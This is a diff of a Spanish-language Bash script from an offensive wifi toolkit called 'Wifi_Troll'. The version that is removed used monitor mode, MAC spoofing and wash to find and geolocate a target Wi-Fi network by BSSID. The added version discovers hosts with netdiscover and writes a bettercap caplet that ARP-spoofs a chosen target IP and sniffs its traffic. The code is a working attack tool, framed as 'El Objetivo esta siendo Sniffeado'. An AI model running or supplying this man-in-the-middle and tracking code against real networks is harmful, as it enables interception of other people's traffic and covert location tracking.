@@ -10,57 +10,29 @@ echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|   
 echo "                           \/                   /_____/                                       "
 echo "                                               ¯\_(ツ)_/¯"
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[3] Geolocalizacion exacta de una Red Wifi"
-echo 
-sudo airmon-ng
+echo "[3] Ver el Trafico de nuestra Red"
 echo
-read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
-read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc2
+read -p "[*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " opc1
 echo
-if [ $opc2 = y ]
-	then
-		sudo airmon-ng check kill >/dev/null
-	else
-echo "OK"
-fi
-sudo ifconfig $interfaz promisc >/dev/null
-sudo airmon-ng start $interfaz >/dev/null
-echo "======================="
-echo "Activando Modo Monitor"
-echo "======================="
-echo "--->""                  |"
-sleep 1
-echo "-------->""             |"
-sleep 1
-echo "--------------->""      |"
-sleep 1
-echo "--------------------->""|"
-echo "======================="
-sudo airmon-ng 
+sudo netdiscover -r $opc1/24 -P
 echo
-read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
+read -p "[*] Pon la IP del Objetivo (Ej: 192.168.1.1): " ip
+read -p "[*] Pon la Interfaz de Red que estes utilizando (Ej: eth0): " interfaz
 echo
-sudo ifconfig $interfaz2 promisc >/dev/null
-sudo ifconfig $interfaz2 down >/dev/null
-sudo macchanger -a $interfaz2 >/dev/null
-sudo ifconfig $interfaz2 up >/dev/null
-echo "======================="
-echo " Activando Modo Seguro"
-echo "======================="
-echo "--->""                  |"
-sleep 1
-echo "-------->""             |"
-sleep 1
-echo "--------------->""      |"
-sleep 1
-echo "--------------------->""|"
-echo "======================="
+cat > requisitos/3.2.cap << eof
+net.probe on
+sleep 8
+set arp.spoof targets $ip
+arp.spoof on
+set net.sniff.verbose false
+net.sniff on
+eof
 clear
 echo
 echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
@@ -71,75 +43,19 @@ echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|   
 echo "                           \/                   /_____/                                       "
 echo "                                               ¯\_(ツ)_/¯"
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[#] Copia el BSSID del Wifi objetivo, puede tardar hasta 1 minuto (Despues Pulse Ctrl + c)"
+echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
 echo
-sudo gnome-terminal -- sudo sudo wash -2 -5 -a -i $interfaz2
-read -p "Pega el BSSID de la Red Wifi que quiera Geolocalizar: " mac
-clear
+echo "========================================================================================="
+echo "                      El Objetivo ($ip) esta siendo Sniffeado"
+echo "========================================================================================="
 echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
-echo "[#] Desactivando Modo Monitor"
-echo
-sudo ifconfig $interfaz2 down >/dev/null
-sudo macchanger -p $interfaz2 >/dev/null
-sudo ifconfig $interfaz2 up >/dev/null
-sudo ifconfig $interfaz2 -promisc >/dev/null
-sudo airmon-ng stop $interfaz2 >/dev/null
-sudo ifconfig $interfaz -promisc >/dev/null
-sudo systemctl restart NetworkManager.service >/dev/null
-echo "=============================="
-echo "        Desactivando"
-echo "   Modo Monitor/Seguridad"
-echo "=============================="
-echo "-------->""                    |"
-sleep 1
-echo "--------------->""             |"
-sleep 1
-echo "---------------------->""      |"
-sleep 1
-echo "---------------------------->""|"
-echo "=============================="
-clear
-echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
-echo "[#] Cordenadas exactas de la Red Wifi ($mac)"
-echo
-cd requisitos/geowifi && sudo python3 geowifi.py -b $mac -m
-cd ..
-cd ..
-echo "[El mapa se encuentra en la ruta requisitos/geowifi/results/(HTML Localizacion $mac)]"
+sudo bettercap -iface $interfaz -caplet requisitos/3.2.cap
 echo
 echo
 echo "#####################"
